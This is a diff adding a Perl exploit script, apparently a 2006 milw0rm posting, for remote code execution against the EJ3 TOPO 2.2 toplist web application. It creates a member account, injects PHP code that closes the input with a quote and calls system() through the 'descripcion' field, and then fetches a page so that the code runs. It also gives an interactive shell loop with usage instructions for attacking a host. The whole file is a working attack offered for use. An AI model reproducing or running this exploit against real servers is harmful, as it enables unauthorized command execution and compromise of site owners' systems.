@@ -1,0 +1,117 @@
+#!/usr/bin/perl
+#
+# EJ3 TOPO  2.2 Remote Code Execution Exploit
+# --------------------------------------------- 
+# Note : This Exploit Just run TOPO 2.2
+# IHST : www.Hackerz.Ir 
+# AST  : www.aria-security.net
+###### (C)oded & Discovered By Hessam-x
+
+use LWP::UserAgent;
+use LWP::Simple;
+use HTTP::Cookies;
+
+
+ $host = $ARGV[0];
+
+ $url = "http://".$host;
+
+&hed;
+    print " [~] Host : $host \n";
+    print " [~] Conecting ...\n";
+
+
+ $xpl = LWP::UserAgent->new() or die;
+ $cookie_jar = HTTP::Cookies->new();
+ $xpl->cookie_jar( $cookie_jar );
+ 
+ $res = $xpl->post($url.'index.php',
+ Content => [
+ "email"   => "info@yahoo.com",
+ "web"   => "Yahoo.Com",
+ "webURL"   => "http://www.yahoo.com",
+ "BannerURL"   => "http://www.yahoo.com/logo.jpg",
+ "descripcion" => "YAHOO!INC",
+ "country" => "as",
+ "m" => "members",
+ "s" => "html",
+ "t" => "join",
+ "paso" => "2",
+ "ID" => "shell",
+ ],);
+
+ print " [+] Created a user ...\n";
+ &run;
+ 
+
+ 
+ sub hed()
+{
+ print q(
+ ###########################################################
+ #        EJ3 TOPO <= 2.1 Remote Code Execution Exploit    #
+ #                                                         #
+ ############# Coded & discovered By Hessam-x ##############
+
+);
+
+ 
+ if (@ARGV < 1) {
+ print " #  usage : hx.pl [host&path]\n"; 
+ print " #  E.g : hx.pl www.milw0rm.com/toplist/\n"; 
+  exit();
+ }
+ 
+} 
+ 
+    while ()
+{
+    &run
+    }
+  sub run()
+ {  
+
+      print "\n[Shell]\$";
+      chomp($exc=<STDIN>);
+    
+        exit() if ($exc eq 'exit');
+
+ 
+ 
+  $commd = "system(\"$exc\")";
+  $cmd  = 'echo 1 ; echo _START_ ; '.$commd.' ; echo _END_';
+
+
+ $req = $xpl->post($url.'index.php',
+ Content => [
+ "passwordNEW" => "0",
+ "email"   => "info@yahoo.com",
+ "webURL"   => "http://www.yahoo.com",
+ "BannerURL"   => "http://www.yahoo.com/logo.jpg",
+ "descripcion" => "YAHOO!INC' ;  $cmd ; ?>//",
+ "country" => "unknow",
+ "m" => "members",
+ "s" => "html",
+ "t" => "edit",
+ "paso" => "2",
+ "password" => "0",
+ "ID" => "shell",
+ ],);
+ $res = $xpl->get($url.'index.php?m=top&s=out&ID=shell');
+ @result = split(/\n/,$res->content);
+ $runned = 0;
+ $on = 0;
+ print "\n";
+ for $res(@result)
+  {
+    if ($res =~ /^_END_/) { print "\n"; return 0; }
+    if ($on == 0) { print "  $res\n"; }
+    if ($res =~ /^_START_/) { $on = 1; $runned = 1; } 
+  }
+    if (!$runned) { print "Can not execute command . EXPLOIT FAILED !\n" ; };
+   
+  
+  
+  }
+
+# milw0rm.com [2006-07-10]
